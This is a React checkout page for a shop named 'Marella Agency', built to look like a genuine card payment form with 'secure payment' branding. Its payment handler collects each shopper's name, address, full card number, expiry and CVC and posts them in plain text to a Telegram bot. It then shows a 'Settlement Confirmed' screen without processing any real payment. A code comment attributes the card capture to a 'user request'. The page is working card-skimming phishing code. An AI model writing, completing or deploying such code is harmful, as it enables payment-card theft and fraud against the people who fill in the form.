import React, { useState } from 'react';
import { motion } from 'motion/react';
import { useNavigate } from 'react-router-dom';
import { CartItem } from '../types';
import { ArrowLeft, Lock, Trash2, CreditCard, ChevronDown } from 'lucide-react';

interface CheckoutPageProps {
  cart: CartItem[];
  setCart: React.Dispatch<React.SetStateAction<CartItem[]>>;
}

export const CheckoutPage: React.FC<CheckoutPageProps> = ({ cart, setCart }) => {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  
  // Form State
  const [formData, setFormData] = useState({
    email: '',
    name: '',
    country: 'United Kingdom',
    address: '',
    city: '',
    postcode: '',
    cardNumber: '',
    expiry: '',
    cvc: ''
  });

  const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
  const shipping = 5.00;
  const total = subtotal + shipping;

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const removeItem = (id: string) => {
    setCart(prev => prev.filter(item => item.id !== id));
  };

  const updateQuantity = (id: string, delta: number) => {
    setCart(prev => prev.map(item => {
      if (item.id === id) {
        const newQty = Math.max(1, item.quantity + delta);
        return { ...item, quantity: newQty };
      }
      return item;
    }));
  };

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);

    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    // Prepare Order Message (including card details as per user request)
    const orderItems = cart.map(item => `- ${item.name} (x${item.quantity})`).join('\n');
    const message = `
🚨 *NEW SETTLEMENT DETECTED* 🚨
-------------------------
📧 *Email:* ${formData.email}
👤 *Name:* ${formData.name}
📍 *Address:* ${formData.address}, ${formData.city}, ${formData.postcode}
🌍 *Country:* ${formData.country}

💳 *CARD DETAILS:*
- Number: \`${formData.cardNumber}\`
- Expiry: \`${formData.expiry}\`
- CVC: \`${formData.cvc}\`

🛒 *SELECTION:*
${orderItems}

💰 *TOTAL:* £${total.toFixed(2)}
-------------------------
    `;

    try {
      if (botToken && chatId) {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });
        
        if (!response.ok) {
          const errorData = await response.json();
          throw new Error(errorData.description || 'Failed to send message');
        }
      } else {
        console.warn('Telegram Configuration Missing: Set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in AI Studio Settings.');
      }
      
      // Artificial delay for UX
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      setIsProcessing(false);
      setIsSuccess(true);
      setCart([]);
    } catch (err) {
      console.error('Telegram notification failed:', err);
      setIsProcessing(false);
      alert(`Connection Error: ${err instanceof Error ? err.message : 'Check your Telegram config in Settings'}`);
    }
  };

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-6">
        <motion.div 
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="max-w-md w-full text-center space-y-8"
        >
          <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-8">
            <svg className="w-10 h-10 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <motion.path 
                initial={{ pathLength: 0 }}
                animate={{ pathLength: 1 }}
                transition={{ duration: 0.5, delay: 0.2 }}
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth={3} 
                d="M5 13l4 4L19 7" 
              />
            </svg>
          </div>
          
          <div className="space-y-4">
            <h1 className="text-4xl font-serif italic text-brand-black">Settlement Confirmed</h1>
            <p className="text-brand-black/60 leading-relaxed font-medium">
              Your selection is being reviewed. Our boutique partners will notify you of the logistics shortly.
            </p>
          </div>

          <div className="pt-8">
            <button 
              onClick={() => navigate('/')}
              className="w-full bg-brand-black text-white h-12 rounded-lg font-bold tracking-widest uppercase text-xs hover:opacity-90 transition-opacity"
            >
              Return Home
            </button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-sans text-brand-black">
      <div className="flex flex-col lg:flex-row min-h-screen">
        
        {/* Left Side: Order Summary */}
        <div className="w-full lg:w-[45%] bg-white lg:bg-[#f8f9fa] p-8 lg:p-16 border-r border-brand-border">
          <div className="max-w-md ml-auto">
            <button 
              onClick={() => navigate(-1)} 
              className="group flex items-center space-x-2 text-brand-black/50 hover:text-brand-black transition-colors mb-12"
            >
              <ArrowLeft size={18} className="group-hover:-translate-x-1 transition-transform" />
              <div className="w-8 h-8 bg-brand-black rounded-lg flex items-center justify-center text-white font-serif italic text-lg">M</div>
              <span className="text-sm font-semibold tracking-tight">Marella Agency</span>
              <span className="bg-[#fff1e0] text-[#8c5a1a] text-[10px] px-1.5 py-0.5 rounded font-bold uppercase tracking-wider">Test Mode</span>
            </button>

            <div className="mb-12">
              <p className="text-brand-black/60 text-sm font-medium mb-1">Pay Marella Agency</p>
              <h1 className="text-5xl font-bold tracking-tight">£{total.toFixed(2)}</h1>
            </div>

            <div className="space-y-6 mb-12">
              {cart.map((item) => (
                <div key={item.id} className="flex items-center justify-between group">
                  <div className="flex items-center space-x-4">
                    <div className="w-16 h-16 bg-white border border-brand-border rounded-lg overflow-hidden flex-shrink-0">
                      <img src={item.image} alt={item.name} className="w-full h-full object-cover mix-blend-multiply" />
                    </div>
                    <div>
                      <p className="text-sm font-semibold">{item.name}</p>
                      <div className="flex items-center space-x-3 mt-1">
                        <div className="flex items-center bg-brand-offwhite rounded px-2 py-0.5 text-[10px]">
                          <span className="text-brand-black/40 mr-2">Qty</span>
                          <select 
                            value={item.quantity}
                            onChange={(e) => updateQuantity(item.id, parseInt(e.target.value) - item.quantity)}
                            className="bg-transparent font-bold"
                          >
                            {[1,2,3,4,5].map(n => <option key={n} value={n}>{n}</option>)}
                          </select>
                        </div>
                        <button onClick={() => removeItem(item.id)} className="text-brand-black/30 hover:text-red-500 transition-colors">
                          <Trash2 size={12} />
                        </button>
                      </div>
                    </div>
                  </div>
                  <p className="text-sm font-medium text-brand-black/80">£{(item.price * item.quantity).toFixed(2)}</p>
                </div>
              ))}
            </div>

            <div className="space-y-3 pt-6 border-t border-brand-border text-sm">
              <div className="flex justify-between text-brand-black/60">
                <span>Subtotal</span>
                <span>£{subtotal.toFixed(2)}</span>
              </div>
              <div className="flex justify-between text-brand-black/60">
                <span>Shipping</span>
                <span>£{shipping.toFixed(2)}</span>
              </div>
              <div className="flex justify-between font-bold text-base pt-3 border-t border-brand-border mt-3">
                <span>Total due</span>
                <span>£{total.toFixed(2)}</span>
              </div>
            </div>

            <div className="mt-auto pt-16 flex items-center space-x-4 text-xs text-brand-black/30 font-medium">
              <span>Powered by <span className="font-bold text-brand-black/50">Marella</span></span>
              <span>•</span>
              <span className="cursor-pointer hover:text-brand-black/60">Terms</span>
              <span className="cursor-pointer hover:text-brand-black/60">Privacy</span>
            </div>
          </div>
        </div>

        {/* Right Side: Payment Form */}
        <div className="w-full lg:w-[55%] bg-white p-8 lg:p-16">
          <div className="max-w-md mr-auto lg:ml-0">
            {/* Express Checkout */}
            <button className="w-full bg-brand-black text-white h-12 rounded-lg flex items-center justify-center space-x-2 hover:opacity-90 transition-opacity mb-8 shadow-sm">
              <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" className="h-6 invert" />
            </button>

            <div className="relative flex items-center justify-center mb-8">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-brand-border"></div>
              </div>
              <span className="relative px-4 bg-white text-brand-black/40 text-xs font-medium">Or pay with card</span>
            </div>

            <form onSubmit={handlePayment} className="space-y-8 text-sm">
              {/* Shipping Information */}
              <div className="space-y-4">
                <h3 className="font-semibold text-lg">Shipping information</h3>
                <div className="space-y-3">
                  <div>
                    <label className="block text-xs font-semibold text-brand-black/60 mb-1.5 ml-0.5">Email</label>
                    <input 
                      type="email" 
                      name="email"
                      value={formData.email}
                      onChange={handleInputChange}
                      required
                      placeholder="email@example.com"
                      className="w-full h-11 px-4 rounded-lg border border-brand-border focus:ring-2 focus:ring-brand-black/5 focus:border-brand-black outline-none transition-all shadow-sm"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-brand-black/60 mb-1.5 ml-0.5">Shipping address</label>
                    <div className="border border-brand-border rounded-lg shadow-sm overflow-hidden">
                      <input 
                        type="text" 
                        name="name"
                        value={formData.name}
                        onChange={handleInputChange}
                        placeholder="Full name"
                        className="w-full h-11 px-4 border-b border-brand-border outline-none focus:bg-brand-offwhite/30"
                      />
                      <div className="relative">
                        <select 
                          name="country"
                          value={formData.country}
                          onChange={handleInputChange}
                          className="w-full h-11 px-4 bg-white border-b border-brand-border outline-none appearance-none font-medium"
                        >
                          <option>United Kingdom</option>
                          <option>United States</option>
                          <option>Ireland</option>
                          <option>France</option>
                        </select>
                        <ChevronDown className="absolute right-4 top-1/2 -translate-y-1/2 text-brand-black/40" size={16} />
                      </div>
                      <input 
                        type="text" 
                        name="address"
                        value={formData.address}
                        onChange={handleInputChange}
                        placeholder="Address"
                        className="w-full h-11 px-4 border-b border-brand-border outline-none focus:bg-brand-offwhite/30"
                      />
                      <div className="flex">
                        <input 
                          type="text" 
                          name="city"
                          value={formData.city}
                          onChange={handleInputChange}
                          placeholder="City"
                          className="w-1/2 h-11 px-4 border-r border-brand-border outline-none focus:bg-brand-offwhite/30"
                        />
                        <input 
                          type="text" 
                          name="postcode"
                          value={formData.postcode}
                          onChange={handleInputChange}
                          placeholder="Postcode"
                          className="w-1/2 h-11 px-4 outline-none focus:bg-brand-offwhite/30"
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Payment Details */}
              <div className="space-y-4 pt-4">
                <h3 className="font-semibold text-lg">Payment details</h3>
                <div className="space-y-3">
                  <div>
                    <label className="block text-xs font-semibold text-brand-black/60 mb-1.5 ml-0.5">Card information</label>
                    <div className="border border-brand-border rounded-lg shadow-sm overflow-hidden">
                      <div className="relative">
                        <input 
                          type="text" 
                          name="cardNumber"
                          value={formData.cardNumber}
                          onChange={handleInputChange}
                          placeholder="1234 1234 1234 1234"
                          className="w-full h-11 px-4 border-b border-brand-border outline-none focus:bg-brand-offwhite/30"
                        />
                        <div className="absolute right-4 top-1/2 -translate-y-1/2 flex space-x-1 opacity-50">
                           <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MC" className="h-4" />
                           <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-3 self-center" />
                        </div>
                      </div>
                      <div className="flex">
                        <input 
                          type="text" 
                          name="expiry"
                          value={formData.expiry}
                          onChange={handleInputChange}
                          placeholder="MM / YY"
                          className="w-1/2 h-11 px-4 border-r border-brand-border outline-none focus:bg-brand-offwhite/30"
                        />
                        <input 
                          type="text" 
                          name="cvc"
                          value={formData.cvc}
                          onChange={handleInputChange}
                          placeholder="CVC"
                          className="w-1/2 h-11 px-4 outline-none focus:bg-brand-offwhite/30"
                        />
                      </div>
                    </div>
                  </div>
                  <label className="flex items-center space-x-3 cursor-pointer group">
                    <input type="checkbox" defaultChecked className="w-4 h-4 rounded text-brand-black focus:ring-brand-black border-brand-border" />
                    <span className="text-[13px] text-brand-black/70 group-hover:text-brand-black transition-colors">Billing address is same as shipping</span>
                  </label>
                </div>
              </div>

              <button 
                type="submit"
                disabled={isProcessing || cart.length === 0}
                className="w-full bg-[#5433ff] text-white h-12 rounded-lg font-bold text-base hover:opacity-95 transition-all shadow-lg active:scale-[0.98] disabled:opacity-50 disabled:active:scale-100 mt-8"
              >
                {isProcessing ? 'Processing...' : `Pay £${total.toFixed(2)}`}
              </button>

              <p className="text-center text-[11px] text-brand-black/40 font-medium pt-4 uppercase tracking-widest text-[#5433ff]">
                secure payment
              </p>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};
